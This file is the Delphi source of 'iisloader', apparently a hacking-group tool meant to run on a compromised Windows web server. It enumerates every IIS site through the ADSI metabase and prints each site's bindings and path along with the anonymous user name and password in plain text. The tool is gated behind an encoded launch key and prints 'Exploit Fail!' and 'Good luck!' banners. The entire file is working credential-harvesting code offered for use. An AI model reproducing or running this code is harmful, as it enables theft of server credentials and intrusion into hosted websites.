{ ///////////////////////////////////////////////////////////////////////////////
+
+  Program Name : iisloader
+                             @ Author : H3xIe Security Team # CN 2005 - 2012
+                             @ 2012/6/6 | E-Mail : admin@hkmjj.com
+    Please  Import types library. activeds.dll, adsiis.dll, iisext.dll
} ///////////////////////////////////////////////////////////////////////////////
{
 DLL :
  ActiveDs.dll: ADS Router Layer DLL
  ActiveDs.tlb: Type Liberary
  Adsiisex.dll: ADSI Extension
  Adsiis.dll: ADs IIS Provider DLL
  Adsldp.dll: ADs LDAP Provider DLL
  Adsldpc.dll: ADs LDAP Provider C DLL
  Adsmsext.dll: ADs LDAP Provider DLL
  Adsnds.dll: ADs NDS Provider DLL
  Adsnt.dll: ADs Windows NT Provider DLL
  Adsnw.dll: ADs Netware 3.12 Provider DLL
  
}
program IISLoder;

{$APPTYPE CONSOLE}

uses
  Windows;
  //Variants;
  //IISExt_TLB in '..\..\..\..\Program Files\Borland_\Delphi7\Imports\IISExt_TLB.pas',
  //IISOle_TLB in '..\..\..\..\Program Files\Borland_\Delphi7\Imports\IISOle_TLB.pas',
  //ActiveDs_TLB in '..\..\..\..\Program Files\Borland_\Delphi7\Imports\ActiveDs_TLB.pas';

const
  IID_IADsContainer: TGUID = '{001677D0-FD16-11CE-ABC4-02608C9E7553}';
  MAX_ExecuteTime : Integer = 1000 * 60 * 3;
  Str_Code = '21644479215523456';  // local
var
  Loaded_Bool : Boolean = False;
type
  IEnumVariant = interface(IUnknown)
    ['{00020404-0000-0000-C000-000000000046}']
    function Next(celt: LongWord; var rgvar : OleVariant;
      out pceltFetched: LongWord): HResult; stdcall;
    function Skip(celt: LongWord): HResult; stdcall;
    function Reset: HResult; stdcall;
    function Clone(out Enum: IEnumVariant): HResult; stdcall;
    end;
// *********************************************************************//
// Interface: IADs
// Flags:     (4416) Dual OleAutomation Dispatchable
// GUID:      {FD8256D0-FD15-11CE-ABC4-02608C9E7553}
// *********************************************************************//
  IADs = interface(IDispatch)
    ['{FD8256D0-FD15-11CE-ABC4-02608C9E7553}']
    function Get_Name: WideString; safecall;
    function Get_Class_: WideString; safecall;
    function Get_GUID: WideString; safecall;
    function Get_ADsPath: WideString; safecall;
    function Get_Parent: WideString; safecall;
    function Get_Schema: WideString; safecall;
    procedure GetInfo; safecall;
    procedure SetInfo; safecall;
    function Get(const bstrName: WideString): OleVariant; safecall;
    procedure Put(const bstrName: WideString; vProp: OleVariant); safecall;
    function GetEx(const bstrName: WideString): OleVariant; safecall;
    procedure PutEx(lnControlCode: Integer; const bstrName: WideString; vProp: OleVariant); safecall;
    procedure GetInfoEx(vProperties: OleVariant; lnReserved: Integer); safecall;
    property Name: WideString read Get_Name;
    property Class_: WideString read Get_Class_;
    property GUID: WideString read Get_GUID;
    property ADsPath: WideString read Get_ADsPath;
    property Parent: WideString read Get_Parent;
    property Schema: WideString read Get_Schema;
  end;

// *********************************************************************//
// Interface: IADsContainer
// Flags:     (4416) Dual OleAutomation Dispatchable
// GUID:      {001677D0-FD16-11CE-ABC4-02608C9E7553}
// *********************************************************************//
  IADsContainer = interface(IDispatch)
    ['{001677D0-FD16-11CE-ABC4-02608C9E7553}']
    function Get_Count: Integer; safecall;
    function Get__NewEnum: IUnknown; safecall;
    function Get_Filter: OleVariant; safecall;
    procedure Set_Filter(pVar: OleVariant); safecall;
    function Get_Hints: OleVariant; safecall;
    procedure Set_Hints(pvFilter: OleVariant); safecall;
    function GetObject(const ClassName: WideString; const RelativeName: WideString): IDispatch; safecall;
    function Create(const ClassName: WideString; const RelativeName: WideString): IDispatch; safecall;
    procedure Delete(const bstrClassName: WideString; const bstrRelativeName: WideString); safecall;
    function CopyHere(const SourceName: WideString; const NewName: WideString): IDispatch; safecall;
    function MoveHere(const SourceName: WideString; const NewName: WideString): IDispatch; safecall;
    property Count: Integer read Get_Count;
    property _NewEnum: IUnknown read Get__NewEnum;
    property Filter: OleVariant read Get_Filter write Set_Filter;
    property Hints: OleVariant read Get_Hints write Set_Hints;
  end;

// *********************************************************************//
// Interface: IADsMembers
// Flags:     (4416) Dual OleAutomation Dispatchable
// GUID:      {451A0030-72EC-11CF-B03B-00AA006E0975}
// *********************************************************************//
  IADsMembers = interface(IDispatch)
    ['{451A0030-72EC-11CF-B03B-00AA006E0975}']
    function Get_Count: Integer; safecall;
    function Get__NewEnum: IUnknown; safecall;
    function Get_Filter: OleVariant; safecall;
    procedure Set_Filter(pvFilter: OleVariant); safecall;
    property Count: Integer read Get_Count;
    property _NewEnum: IUnknown read Get__NewEnum;
    property Filter: OleVariant read Get_Filter write Set_Filter;
  end;

// *********************************************************************//
// Interface: IADsUser
// Flags:     (4416) Dual OleAutomation Dispatchable
// GUID:      {3E37E320-17E2-11CF-ABC4-02608C9E7553}
// *********************************************************************//
  IADsUser = interface(IADs)
    ['{3E37E320-17E2-11CF-ABC4-02608C9E7553}']
    function Get_BadLoginAddress: WideString; safecall;
    function Get_BadLoginCount: Integer; safecall;
    function Get_LastLogin: TDateTime; safecall;
    function Get_LastLogoff: TDateTime; safecall;
    function Get_LastFailedLogin: TDateTime; safecall;
    function Get_PasswordLastChanged: TDateTime; safecall;
    function Get_Description: WideString; safecall;
    procedure Set_Description(const retval: WideString); safecall;
    function Get_Division: WideString; safecall;
    procedure Set_Division(const retval: WideString); safecall;
    function Get_Department: WideString; safecall;
    procedure Set_Department(const retval: WideString); safecall;
    function Get_EmployeeID: WideString; safecall;
    procedure Set_EmployeeID(const retval: WideString); safecall;
    function Get_FullName: WideString; safecall;
    procedure Set_FullName(const retval: WideString); safecall;
    function Get_FirstName: WideString; safecall;
    procedure Set_FirstName(const retval: WideString); safecall;
    function Get_LastName: WideString; safecall;
    procedure Set_LastName(const retval: WideString); safecall;
    function Get_OtherName: WideString; safecall;
    procedure Set_OtherName(const retval: WideString); safecall;
    function Get_NamePrefix: WideString; safecall;
    procedure Set_NamePrefix(const retval: WideString); safecall;
    function Get_NameSuffix: WideString; safecall;
    procedure Set_NameSuffix(const retval: WideString); safecall;
    function Get_Title: WideString; safecall;
    procedure Set_Title(const retval: WideString); safecall;
    function Get_Manager: WideString; safecall;
    procedure Set_Manager(const retval: WideString); safecall;
    function Get_TelephoneHome: OleVariant; safecall;
    procedure Set_TelephoneHome(retval: OleVariant); safecall;
    function Get_TelephoneMobile: OleVariant; safecall;
    procedure Set_TelephoneMobile(retval: OleVariant); safecall;
    function Get_TelephoneNumber: OleVariant; safecall;
    procedure Set_TelephoneNumber(retval: OleVariant); safecall;
    function Get_TelephonePager: OleVariant; safecall;
    procedure Set_TelephonePager(retval: OleVariant); safecall;
    function Get_FaxNumber: OleVariant; safecall;
    procedure Set_FaxNumber(retval: OleVariant); safecall;
    function Get_OfficeLocations: OleVariant; safecall;
    procedure Set_OfficeLocations(retval: OleVariant); safecall;
    function Get_PostalAddresses: OleVariant; safecall;
    procedure Set_PostalAddresses(retval: OleVariant); safecall;
    function Get_PostalCodes: OleVariant; safecall;
    procedure Set_PostalCodes(retval: OleVariant); safecall;
    function Get_SeeAlso: OleVariant; safecall;
    procedure Set_SeeAlso(retval: OleVariant); safecall;
    function Get_AccountDisabled: WordBool; safecall;
    procedure Set_AccountDisabled(retval: WordBool); safecall;
    function Get_AccountExpirationDate: TDateTime; safecall;
    procedure Set_AccountExpirationDate(retval: TDateTime); safecall;
    function Get_GraceLoginsAllowed: Integer; safecall;
    procedure Set_GraceLoginsAllowed(retval: Integer); safecall;
    function Get_GraceLoginsRemaining: Integer; safecall;
    procedure Set_GraceLoginsRemaining(retval: Integer); safecall;
    function Get_IsAccountLocked: WordBool; safecall;
    procedure Set_IsAccountLocked(retval: WordBool); safecall;
    function Get_LoginHours: OleVariant; safecall;
    procedure Set_LoginHours(retval: OleVariant); safecall;
    function Get_LoginWorkstations: OleVariant; safecall;
    procedure Set_LoginWorkstations(retval: OleVariant); safecall;
    function Get_MaxLogins: Integer; safecall;
    procedure Set_MaxLogins(retval: Integer); safecall;
    function Get_MaxStorage: Integer; safecall;
    procedure Set_MaxStorage(retval: Integer); safecall;
    function Get_PasswordExpirationDate: TDateTime; safecall;
    procedure Set_PasswordExpirationDate(retval: TDateTime); safecall;
    function Get_PasswordMinimumLength: Integer; safecall;
    procedure Set_PasswordMinimumLength(retval: Integer); safecall;
    function Get_PasswordRequired: WordBool; safecall;
    procedure Set_PasswordRequired(retval: WordBool); safecall;
    function Get_RequireUniquePassword: WordBool; safecall;
    procedure Set_RequireUniquePassword(retval: WordBool); safecall;
    function Get_EmailAddress: WideString; safecall;
    procedure Set_EmailAddress(const retval: WideString); safecall;
    function Get_HomeDirectory: WideString; safecall;
    procedure Set_HomeDirectory(const retval: WideString); safecall;
    function Get_Languages: OleVariant; safecall;
    procedure Set_Languages(retval: OleVariant); safecall;
    function Get_Profile: WideString; safecall;
    procedure Set_Profile(const retval: WideString); safecall;
    function Get_LoginScript: WideString; safecall;
    procedure Set_LoginScript(const retval: WideString); safecall;
    function Get_Picture: OleVariant; safecall;
    procedure Set_Picture(retval: OleVariant); safecall;
    function Get_HomePage: WideString; safecall;
    procedure Set_HomePage(const retval: WideString); safecall;
    function Groups: IADsMembers; safecall;
    procedure SetPassword(const NewPassword: WideString); safecall;
    procedure ChangePassword(const bstrOldPassword: WideString; const bstrNewPassword: WideString); safecall;
    property BadLoginAddress: WideString read Get_BadLoginAddress;
    property BadLoginCount: Integer read Get_BadLoginCount;
    property LastLogin: TDateTime read Get_LastLogin;
    property LastLogoff: TDateTime read Get_LastLogoff;
    property LastFailedLogin: TDateTime read Get_LastFailedLogin;
    property PasswordLastChanged: TDateTime read Get_PasswordLastChanged;
    property Description: WideString read Get_Description write Set_Description;
    property Division: WideString read Get_Division write Set_Division;
    property Department: WideString read Get_Department write Set_Department;
    property EmployeeID: WideString read Get_EmployeeID write Set_EmployeeID;
    property FullName: WideString read Get_FullName write Set_FullName;
    property FirstName: WideString read Get_FirstName write Set_FirstName;
    property LastName: WideString read Get_LastName write Set_LastName;
    property OtherName: WideString read Get_OtherName write Set_OtherName;
    property NamePrefix: WideString read Get_NamePrefix write Set_NamePrefix;
    property NameSuffix: WideString read Get_NameSuffix write Set_NameSuffix;
    property Title: WideString read Get_Title write Set_Title;
    property Manager: WideString read Get_Manager write Set_Manager;
    property TelephoneHome: OleVariant read Get_TelephoneHome write Set_TelephoneHome;
    property TelephoneMobile: OleVariant read Get_TelephoneMobile write Set_TelephoneMobile;
    property TelephoneNumber: OleVariant read Get_TelephoneNumber write Set_TelephoneNumber;
    property TelephonePager: OleVariant read Get_TelephonePager write Set_TelephonePager;
    property FaxNumber: OleVariant read Get_FaxNumber write Set_FaxNumber;
    property OfficeLocations: OleVariant read Get_OfficeLocations write Set_OfficeLocations;
    property PostalAddresses: OleVariant read Get_PostalAddresses write Set_PostalAddresses;
    property PostalCodes: OleVariant read Get_PostalCodes write Set_PostalCodes;
    property SeeAlso: OleVariant read Get_SeeAlso write Set_SeeAlso;
    property AccountDisabled: WordBool read Get_AccountDisabled write Set_AccountDisabled;
    property AccountExpirationDate: TDateTime read Get_AccountExpirationDate write Set_AccountExpirationDate;
    property GraceLoginsAllowed: Integer read Get_GraceLoginsAllowed write Set_GraceLoginsAllowed;
    property GraceLoginsRemaining: Integer read Get_GraceLoginsRemaining write Set_GraceLoginsRemaining;
    property IsAccountLocked: WordBool read Get_IsAccountLocked write Set_IsAccountLocked;
    property LoginHours: OleVariant read Get_LoginHours write Set_LoginHours;
    property LoginWorkstations: OleVariant read Get_LoginWorkstations write Set_LoginWorkstations;
    property MaxLogins: Integer read Get_MaxLogins write Set_MaxLogins;
    property MaxStorage: Integer read Get_MaxStorage write Set_MaxStorage;
    property PasswordExpirationDate: TDateTime read Get_PasswordExpirationDate write Set_PasswordExpirationDate;
    property PasswordMinimumLength: Integer read Get_PasswordMinimumLength write Set_PasswordMinimumLength;
    property PasswordRequired: WordBool read Get_PasswordRequired write Set_PasswordRequired;
    property RequireUniquePassword: WordBool read Get_RequireUniquePassword write Set_RequireUniquePassword;
    property EmailAddress: WideString read Get_EmailAddress write Set_EmailAddress;
    property HomeDirectory: WideString read Get_HomeDirectory write Set_HomeDirectory;
    property Languages: OleVariant read Get_Languages write Set_Languages;
    property Profile: WideString read Get_Profile write Set_Profile;
    property LoginScript: WideString read Get_LoginScript write Set_LoginScript;
    property Picture: OleVariant read Get_Picture write Set_Picture;
    property HomePage: WideString read Get_HomePage write Set_HomePage;
  end;

function ADsGetObject(const PathName: WideString; const GUID:TGUID; out I: IUnknown): HRESULT; stdcall;external 'activeds.dll' name 'ADsGetObject';
function ADsBuildEnumerator(pADsContainer: IADsContainer; out ppEnumVariant: IEnumVARIANT): HRESULT; stdcall;external 'activeds.dll' name 'ADsBuildEnumerator';
function ADsEnumerateNext(pEnumVariant: IEnumVARIANT;
                          cElements: ULONG;
                          var pvar: OleVariant;
                          var pcElementsFetched: ULONG): HRESULT; stdcall;
                          external 'activeds.dll' name 'ADsEnumerateNext';
function CoInitialize(pvReserved: Pointer): HResult; stdcall; external 'ole32.dll' name 'CoInitialize';
function SafeArrayGetUBound(VarArray: PVarArray; Dim: Integer;
  out UBound: Integer): HRESULT; stdcall; external 'oleaut32.dll' name 'SafeArrayGetUBound';


function IntToStr(Value: Integer): ShortString;
// Value  = eax
// Result = edx
asm
  push ebx
  push esi
  push edi

  mov edi,edx
  xor ecx,ecx
  mov ebx,10
  xor edx,edx

  cmp eax,0 // check for negative
  setl dl
  mov esi,edx
  jnl @reads
  neg eax

  @reads:
    mov  edx,0   // edx = eax mod 10
    div  ebx     // eax = eax div 10
    add  edx,48  // '0' = #48
    push edx
    inc  ecx
    cmp  eax,0
  jne @reads

  dec esi
  jnz @positive
  push 45 // '-' = #45
  inc ecx

  @positive:
  mov [edi],cl // set length byte
  inc edi

  @writes:
    pop eax
    mov [edi],al
    inc edi
    dec ecx
  jnz @writes

  pop edi
  pop esi
  pop ebx
end;

function GetVarDataArrayInfo(const AVarData: TVarData; out AVarType: TVarType;
  out AVarArray: PVarArray): Boolean;
begin
  // variant that points to another variant?  lets go spelunking
  if AVarData.VType = varByRef or varVariant then
    Result := GetVarDataArrayInfo(PVarData(AVarData.VPointer)^, AVarType, AVarArray)
  else
  begin

    // make sure we are pointing to an array then
    AVarType := AVarData.VType;
    Result := (AVarType and varArray) <> 0;

    // figure out the array data pointer
    if Result then
      if (AVarType and varByRef) <> 0 then
        AVarArray := PVarArray(AVarData.VPointer^)
      else
        AVarArray := AVarData.VArray
    else
      AVarArray := nil;
  end;
end;


function VarIsArray(const A: Variant; AResolveByRef: Boolean = True): Boolean;
var
  LVarType: TVarType;
  LVarArray: PVarArray;
begin
  if AResolveByRef then
    Result := GetVarDataArrayInfo(TVarData(A), LVarType, LVarArray)
  else
    Result := (TVarData(A).VType and varArray) = varArray;
end;



procedure VarResultCheck(AResult: HRESULT); overload;
begin
    if AResult <> HRESULT($00000000) then Exit;
end;

function VarArrayAsPSafeArray(const A: Variant): PVarArray;
var
  LVarType: TVarType;
begin
  if not GetVarDataArrayInfo(TVarData(A), LVarType, Result) then
    VarResultCheck(HRESULT($80070057));
end;

function VarArrayHighBound(const A: Variant; Dim: Integer): Integer;
begin
   SafeArrayGetUBound(VarArrayAsPSafeArray(A), Dim, Result);
end;

function decode(keys : string):string;
const
  key : array[0..5] of Byte=(
                             $01,
                             $02,
                             $03,
                             $04,
                             $05,
                             $06
                            );
var
i : Integer;
ki : Byte;
x : Byte;
ac : Char;
s ,tmp : string;
m : string;
k1,k2,k3 : ShortString;
c : array of LongInt;
ascii : array of Char;
found : Boolean;
begin
   m := keys;
   if m = '' then
   begin
     Result := 'false';
     Exit;
   end;
   SetLength(c,Length(m));
   for x :=1 to Length(m) do
   begin
     c[x-1] := Ord(m[x]);
   end;
   for x :=0 to High(c) do
   begin
     if ki >High(key) then ki :=0;
     c[x] := c[x] shl key[ki];
     Inc(ki);
   end;
     ki := 0;
   for x :=0 to High(c) do
   begin
    Result := Result + IntToStr(c[x]);
   end;
 end;


procedure USER_Data(SiteID:WideString);
var
 I: IADsContainer;
 ADs: IADsUser;
 SiteUser, SitePass, SitePath, SiteBindings, SiteDescription : Variant;
 WebBindings : string;
 s_i : Integer;
begin
 CoInitialize(nil);
 WebBindings := '';
 try
 if ADsGetObject('IIS://LocalHost/W3SVC', IID_IADsContainer, IUnknown(I)) = S_Ok then
 begin
  ADs := IADsUser(I.GetObject('IIsWebServer', SiteID));
  Writeln(ADs.ADsPath);
  if ADs.QueryInterface(IID_IADsContainer, I) = S_OK then
  begin
    Loaded_Bool := True;
    SiteDescription := ADs.Get('ServerComment');
    Writeln('ServerComment : ' + SiteDescription);
    SiteBindings := ADs.Get('ServerBindings');
    Writeln('ServerBindings :');
    if VarIsArray(SiteBindings) then
    for s_i := 0 to VarArrayHighBound(SiteBindings, 1) do
    begin
      WebBindings := SiteBindings[s_i];
      if WebBindings[1] = ':' then WebBindings := 'localhost' + WebBindings;
      if WebBindings[Length(WebBindings)] = ':' then WebBindings := WebBindings + 'localhost';
      Writeln('[+] ' + WebBindings);
      WebBindings := '';
    end;
    Writeln('Account Information : ');
    ADs := IADsUser(I.GetObject('IIsWebVirtualDir', 'Root'));
    //
    SiteUser   := ADs.Get('AnonymousUserName');
    SitePass   := ADs.Get('AnonymousUserPass');
    SitePath   := ADs.Get('path');
    Writeln('# USER : ' + SiteUser);
    Writeln('# PASS : ' + SitePass);
    Writeln('# PATH : ' + SitePath);
    Writeln;
  end;

 end else Writeln('Failed to read the site information.');//Halt;
 except
   Halt;
   end;

end;

procedure IIS_Loader;
var
 I: IADsContainer;
 lFetch : ULONG;
 pEnum : IEnumVariant;
 recSite : OleVariant;
 pSite  : IADs;
 SITE_ID : string;
 IIS_Class : string;
 ID_I : Integer;
 exec_time : Integer;
begin
 CoInitialize(nil);
 try
 if ADsGetObject('IIS://LocalHost/W3SVC', IID_IADsContainer, IUnknown(I)) <> S_Ok then
 begin
   Writeln;
   Writeln('  Err : Connect to iis fail.');
   Halt;
 end;
 Writeln;
 if ADsBuildEnumerator(I,  pEnum) = S_OK then
 begin
   exec_time := GetTickCount;
   while((ADsEnumerateNext(pEnum, 1, recSite, lFetch ) = S_OK) and (lFetch = 1)) do
   begin
     if (GetTickCount - exec_time) > MAX_ExecuteTime then
     begin
       Writeln('[Err] Read timeout!');
       Halt;
     end;
     IDispatch(recSite).QueryInterface(IADs, pSite);
     IIS_Class := pSite.Class_;
     if(Pos('IIsWebInfo', IIS_Class) = 0) then
     begin
       for ID_I := Length(pSite.ADsPath) downto 1 do
       begin
         if pSite.ADsPath[ID_I] = '/' then Break;
         SITE_ID := pSite.ADsPath[ID_I] + SITE_ID;
       end;
       USER_Data(SITE_ID);
       SITE_ID := '';
     end;
     pSite._Release;
     //Exit;
   end;
   if Loaded_Bool then Writeln('/~/ End.');
 end else Writeln('/IIS/ Failed to read the sites for list!');
 except
   end;

end;

const
  Banner = '/IIS/ Example : IISLoader' + #13 + #10 +
           '/IIS/ FILE NAME : ';
var
  Current_USER : array[0..MAX_PATH] of Char;
  USER_LEN : DWORD;
  FileName : array[0..MAX_PATH] of Char;
begin
  if decode(ParamStr(1)) <> Str_Code then
  begin
   Writeln('Exploit Fail!');
   Halt;
  end else
    GetModuleFileName(0, FileName, MAX_PATH);
    Write(Banner);Writeln(FileName);
    USER_LEN := MAX_PATH;
    GetUserName(Current_USER, USER_LEN);
    Writeln('/IIS/ CURRENT USER : ' + Current_USER + ' \ Good luck !');
    Writeln('/IIS/ 0xFF..F..FF.FF..7C..9..0...FF.. \ Please Wait...');
    IIS_Loader();
end.
